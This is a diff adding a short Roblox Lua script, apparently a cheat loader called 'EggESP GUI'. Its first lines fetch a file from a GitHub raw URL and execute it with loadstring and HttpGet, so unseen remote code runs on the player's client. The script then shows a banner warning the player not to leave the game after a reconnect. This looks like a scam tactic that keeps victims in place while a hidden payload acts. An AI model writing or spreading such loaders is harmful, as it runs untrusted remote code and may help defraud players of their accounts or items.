@@ -1,0 +1,33 @@
+-- Load EggESP GUI
+local success, err = pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/osbornscripts09/EggESP/refs/heads/main/message.txt"))()
+end)
+
+if not success then
+    warn("Failed to load EggESP GUI: " .. tostring(err))
+end
+
+-- Add Mooncat-style warning label
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+local warningGui = Instance.new("ScreenGui")
+warningGui.Name = "ReconnectWarningGui"
+warningGui.IgnoreGuiInset = true
+warningGui.ResetOnSpawn = false
+warningGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+warningGui.Parent = player:WaitForChild("PlayerGui")
+
+local warningLabel = Instance.new("TextLabel")
+warningLabel.Name = "WarningLabel"
+warningLabel.Size = UDim2.new(0, 480, 0, 30)
+warningLabel.Position = UDim2.new(1, -490, 0, 10) -- Top right corner
+warningLabel.BackgroundColor3 = Color3.fromRGB(255, 85, 85)
+warningLabel.BackgroundTransparency = 0.15
+warningLabel.BorderSizePixel = 0
+warningLabel.Text = "⚠ WARNING: DON'T LEAVE THE GAME ONCE IT RECONNECTS OR YOU MIGHT GET BANNED"
+warningLabel.TextColor3 = Color3.new(1, 1, 1)
+warningLabel.TextStrokeTransparency = 0.5
+warningLabel.TextScaled = true
+warningLabel.Font = Enum.Font.GothamBold
+warningLabel.Parent = warningGui
